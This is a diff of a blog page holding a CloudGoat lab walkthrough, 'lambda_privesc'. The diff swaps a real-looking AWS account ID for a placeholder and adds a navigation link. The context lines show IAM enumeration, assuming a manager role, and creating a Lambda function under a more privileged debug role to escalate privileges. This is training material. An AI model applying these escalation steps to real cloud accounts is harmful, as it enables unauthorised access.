@@ -277,15 +277,15 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="/posts/cloud-security-6/">Hands on Cloud Pentesting: 6 - Cloudgoat sqs_flag_shop</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="/posts/smileyctf-2025/">SmileyCTF 2025 - Sculpture Revenge, dry-ice-n-co</a>
                             </li>
                         
                             <li class="bullet">
                                 <a href="/posts/cloud-security-5/">Hands on Cloud Pentesting: 5 - Cloudgoat lambda_privesc</a>
-                            </li>
-                        
-                            <li class="bullet">
-                                <a href="/posts/cloud-security-4/">Hands on Cloud Pentesting: 4 - Cloudgoat iam_privesc_by_rollback</a>
                             </li>
                         
                     
@@ -466,12 +466,12 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 Our username is <code>chris-cgidqyneyhh86l</code>. Using the username we can enumerate the iam policies.
 <img src="image-2.png" alt="enumerate policies">
 We can see that there is one attached policy called <code>cg-chris-policy-cgidqyneyhh86l</code>. We can try to read the policy document. For that, first we need to get the default version of the policy and then get that version.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy --profile chris --policy-arn &#34;arn:aws:iam::139343766080:policy/cg-chris-policy-cgidqyneyhh86l&#34;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy --profile chris --policy-arn &#34;arn:aws:iam::1234567890:policy/cg-chris-policy-cgidqyneyhh86l&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Policy&#34;</span>: {
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;PolicyName&#34;</span>: <span style="color:#e6db74">&#34;cg-chris-policy-cgidqyneyhh86l&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;PolicyId&#34;</span>: <span style="color:#e6db74">&#34;ANPASA4MJEJAEPBI34C2J&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::139343766080:policy/cg-chris-policy-cgidqyneyhh86l&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::1234567890:policy/cg-chris-policy-cgidqyneyhh86l&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Path&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;DefaultVersionId&#34;</span>: <span style="color:#e6db74">&#34;v1&#34;</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;AttachmentCount&#34;</span>: <span style="color:#ae81ff">1</span>,
@@ -496,7 +496,7 @@ We can see that there is one attached policy called <code>cg-chris-policy-cgidqy
 </span></span><span style="display:flex;"><span>        ]
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy-version --profile chris --policy-arn &#34;arn:aws:iam::139343766080:policy/cg-chris-policy-cgidqyneyhh86l&#34; --version-id v1
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy-version --profile chris --policy-arn &#34;arn:aws:iam::1234567890:policy/cg-chris-policy-cgidqyneyhh86l&#34; --version-id v1
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyVersion&#34;</span>: {
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Document&#34;</span>: {
@@ -526,7 +526,7 @@ We can see that there is one attached policy called <code>cg-chris-policy-cgidqy
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Path&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;RoleName&#34;</span>: <span style="color:#e6db74">&#34;cg-debug-role-cgidqyneyhh86l&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;RoleId&#34;</span>: <span style="color:#e6db74">&#34;AROASA4MJEJACOMSAOQO6&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::139343766080:role/cg-debug-role-cgidqyneyhh86l&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::1234567890:role/cg-debug-role-cgidqyneyhh86l&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;CreateDate&#34;</span>: <span style="color:#e6db74">&#34;2025-06-13T11:32:58Z&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;AssumeRolePolicyDocument&#34;</span>: {
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
@@ -547,7 +547,7 @@ We can see that there is one attached policy called <code>cg-chris-policy-cgidqy
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Path&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;RoleName&#34;</span>: <span style="color:#e6db74">&#34;cg-lambdaManager-role-cgidqyneyhh86l&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;RoleId&#34;</span>: <span style="color:#e6db74">&#34;AROASA4MJEJAJH5B2ZB45&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::139343766080:role/cg-lambdaManager-role-cgidqyneyhh86l&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::1234567890:role/cg-lambdaManager-role-cgidqyneyhh86l&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;CreateDate&#34;</span>: <span style="color:#e6db74">&#34;2025-06-13T11:33:10Z&#34;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;AssumeRolePolicyDocument&#34;</span>: {
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
@@ -555,7 +555,7 @@ We can see that there is one attached policy called <code>cg-chris-policy-cgidqy
 </span></span><span style="display:flex;"><span>            {
 </span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Allow&#34;</span>,
 </span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Principal&#34;</span>: {
-</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;AWS&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::139343766080:user/chris-cgidqyneyhh86l&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;AWS&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::1234567890:user/chris-cgidqyneyhh86l&#34;</span>
 </span></span><span style="display:flex;"><span>                },
 </span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Action&#34;</span>: <span style="color:#e6db74">&#34;sts:AssumeRole&#34;</span>
 </span></span><span style="display:flex;"><span>            }
@@ -565,12 +565,12 @@ We can see that there is one attached policy called <code>cg-chris-policy-cgidqy
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;MaxSessionDuration&#34;</span>: <span style="color:#ae81ff">3600</span>
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>There are 2 roles available but only <code>cg-lambdaManager-role-cgidqyneyhh86l</code> has the policy which will allow the Principal - arn of chris user(our user) to allow to Assume the role. To assume the role we can use the following command.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sts assume-role --role-arn arn:aws:iam::139343766080:role/cg-lambdaManager-role-cgidqyneyhh86l --role-session-name lambdamanager --profile chris
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws sts assume-role --role-arn arn:aws:iam::1234567890:role/cg-lambdaManager-role-cgidqyneyhh86l --role-session-name lambdamanager --profile chris
 </span></span></code></pre></div><p>This gives us AccessKeyId, SecretAccessKey and a temporary SessionToken. We can configure this as a new profile.
 <img src="image-3.png" alt="second profile">
 Now lets checkout the policies of the role we have gained access to.
 <img src="image-4.png" alt="check policy"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy-version --profile chris --policy-arn &#34;arn:aws:iam::139343766080:policy/cg-lambdaManager-policy-cgidqyneyhh86l&#34; --version-id v1
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#75715e">//aws iam get-policy-version --profile chris --policy-arn &#34;arn:aws:iam::1234567890:policy/cg-lambdaManager-policy-cgidqyneyhh86l&#34; --version-id v1
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// v1 was the default policy version
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;PolicyVersion&#34;</span>: {
@@ -616,7 +616,7 @@ lambda.py</li>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> response
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip lambda.zip lambda.py
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>aws lambda create-function --function-name my_function --runtime python3.9 --role arn:aws:iam::139343766080:role/cg-debug-role-cgidqyneyhh86l --handler lambda.lambda_handler --zip-file fileb://lambda.zip --region us-east-1 --profile lambdamanager
+</span></span><span style="display:flex;"><span>aws lambda create-function --function-name my_function --runtime python3.9 --role arn:aws:iam::1234567890:role/cg-debug-role-cgidqyneyhh86l --handler lambda.lambda_handler --zip-file fileb://lambda.zip --region us-east-1 --profile lambdamanager
 </span></span></code></pre></div><ol start="2">
 <li>Invoke the lambda function.
 Now if we list the lambda functions, we should see our new function here.</li>
@@ -626,9 +626,9 @@ Now if we list the lambda functions, we should see our new function here.</li>
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Functions&#34;</span>: [
 </span></span><span style="display:flex;"><span>        {
 </span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;FunctionName&#34;</span>: <span style="color:#e6db74">&#34;my_function&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;FunctionArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:lambda:us-east-1:139343766080:function:my_function&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;FunctionArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:lambda:us-east-1:1234567890:function:my_function&#34;</span>,
 </span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Runtime&#34;</span>: <span style="color:#e6db74">&#34;python3.9&#34;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::139343766080:role/cg-debug-role-cgidqyneyhh86l&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::1234567890:role/cg-debug-role-cgidqyneyhh86l&#34;</span>,
 </span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Handler&#34;</span>: <span style="color:#e6db74">&#34;lambda.lambda_handler&#34;</span>,
 </span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;CodeSize&#34;</span>: <span style="color:#ae81ff">346</span>,
 </span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Description&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
@@ -696,6 +696,13 @@ Now if we list the lambda functions, we should see our new function here.</li>
         <ul class="series">
             
             
+            
+            <li>
+                June 18, 2025 -
+                
+                    <a href="/posts/cloud-security-6/">Hands on Cloud Pentesting: 6 - Cloudgoat sqs_flag_shop</a>
+                
+            </li>
             
             <li>
                 June 13, 2025 -
